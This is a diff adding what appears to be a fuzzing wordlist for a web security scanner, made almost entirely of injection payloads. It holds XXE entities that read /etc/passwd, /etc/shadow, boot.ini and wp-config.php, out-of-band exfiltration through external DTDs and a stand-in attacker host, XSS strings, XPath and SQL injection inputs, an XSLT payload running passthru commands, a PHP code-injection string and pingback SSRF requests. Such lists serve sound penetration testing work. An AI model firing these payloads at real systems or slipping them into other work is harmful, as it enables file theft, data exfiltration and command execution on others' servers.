@@ -1,0 +1,165 @@
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"}}</script>'
+"}}</script><script>alert(1);</script></body></html><!--
+## After XML Declaration
+## Element and Attrib Values
+$
+%
+%foo;
+&apos;XoiZR
+&foo;
+&lt;% Tnn96 %&gt;
+&lt;%= Tnn96 %&gt;
+&lt;? Tnn96 ?&gt;
+&lt;?Tnn96 ?&gt;
+&lt;Tnn96&gt;
+&quot;XoiZR
+' or ''='
+' or '1'='1
+'}}</script>"
+'}}</script>'
+(Tnn96)
+*
+*/*
++
+-
+-1
+/
+//
+//*
+0
+0.00005
+0.1
+0.9
+1
+1.7976931348623157e+308
+5e-10
+5e-324
+:
+;
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
+<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "http://crowdshield.com/.testing/rfi_vuln.txt"> ]>
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>
+<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<!ENTITY systemEntity SYSTEM "robots.txt">
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<test></test>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi.txt" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://sn1persecurity.com</string></value></param></params></methodCall>
+<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini" >]><doc><test>Contents of file: &xxe;</test></doc>
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php" >]><doc><test>Contents of file: &xxe;</test></doc>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../../boot.ini"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../boot.ini" ]> <change-log> <text>&systemEntity;</text>; </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text> </change-log>
+<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
+<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"> ]><change-log><text>Hello &myEntity;</text></change-log>
+<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"><!ENTITY myQuote "&quot;"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>
+<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
+<?xml version="1.0"?><change-log><text><script>alert(1)</script></text></change-log>
+<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
+<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>
+<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">%f5a30; ]>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<HTML xmlns:xss><?import namespace="xss" implementation="https://crowdshield.com/.testing/xss.html"><xss:xss>XSS</xss:xss></HTML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<change-log> <text>&systemEntity;</text> </change-log>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<name>','')); phpinfo(); exit;/*</name>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>
+<test></test>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
+<xml SRC="https://crowdshield.com/.testing/rfi_vuln.txt" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+<xml SRC="https://crowdshield.com/.testing/xss.html" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "../../../../../../../etc/passwd">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://sn1persecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+@
+@*
+[Tnn96]
+]>
+count(/child::node())
+false
+null
+true
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+{= Tnn96}
+{Tnn96}
+{{= Tnn96}}
+{{Tnn96}}
+}}</script>""'"
+}}</script>'
+}}</script>'"
+}}</script><script>alert(1);</script></body></html><!--
+‘
+“
